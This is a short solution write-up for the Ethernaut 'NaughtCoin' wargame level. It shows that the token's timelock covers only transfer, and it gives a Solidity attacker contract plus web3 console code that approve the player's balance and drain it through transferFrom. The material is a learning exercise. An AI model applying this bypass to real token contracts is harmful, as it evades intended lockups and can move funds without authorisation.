in ERC20 it is possible to approve another spender (`approve`) to transfer from our balance using `transferFrom` which isn't overriden in NaughtCoin

```
interface NaughtCoin {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract HackNaughtCoin {
    function hack(address instance, address player,  address recipient, uint256 amount) public {
        NaughtCoin coin =  NaughtCoin(instance);
        coin.transferFrom(player, recipient, amount);
    }
}
```

```
const balance = await contract.balanceOf(player);
await contract.approve('<contract address>', balance);

const abi = ...;
hackNaughtCoinContract = new web3.eth.Contract(abi, '<contract address>');
hackNaughtCoinContract.methods.hack(instance, player,  ethernaut.address, balance).send({ from: player });
```
